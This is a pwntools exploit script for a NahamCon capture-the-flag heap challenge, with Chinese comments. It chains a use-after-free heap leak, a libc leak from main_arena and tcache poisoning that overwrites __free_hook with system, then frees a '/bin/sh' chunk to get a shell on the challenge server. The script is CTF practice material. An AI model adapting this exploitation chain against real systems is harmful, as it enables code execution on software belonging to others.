from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./found_memory"
libc_path = "./libc.so.6"

elf = ELF(vuln_path)
libc = elf.libc

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("challenge.nahamcon.com", 32573)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add():
    io.sendlineafter(">", "1")

def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("free:", str(idx))

def view(idx):
    io.sendlineafter(">", "3")
    io.sendlineafter("view: ", str(idx))

def edit(idx, content):
    io.sendlineafter(">", "4")
    io.sendlineafter("edit:", str(idx))
    io.sendafter("data:", content)

payload = b""
# io.sendline(payload)

# 泄漏heap
add()
delete(0)
view(0)
leak = io.recvline()
heap_top = u64(leak[8:16]) - 0x10
log.success("heap_top:-----> " + hex(heap_top))

# 构造一个unsorted
for i in range(20):
    add()

delete(1)
delete(2)
edit(2, p64(heap_top+0x300))
add()
add()
edit(2, p64(0)*3+p64(0x441))
delete(1)

# 泄漏main_arena -->libc
view(1)
main_delta =  0x7ff7c5740be0  -  0x7ff7c5554000 
leak = io.recv(20)
libc.address = u64(leak[:6].ljust(8, b"\x00")) - main_delta
log.success("libc.address:-----> " + hex(libc.address))

# free_hook->system
free_hook = libc.symbols["__free_hook"]
system_addr = libc.symbols["system"]
delete(3)
delete(4)
edit(4, p64(free_hook))

add()
add()
edit(3, p64(system_addr))


edit(5, b"/bin/sh\x00")
delete(5)

io.interactive()
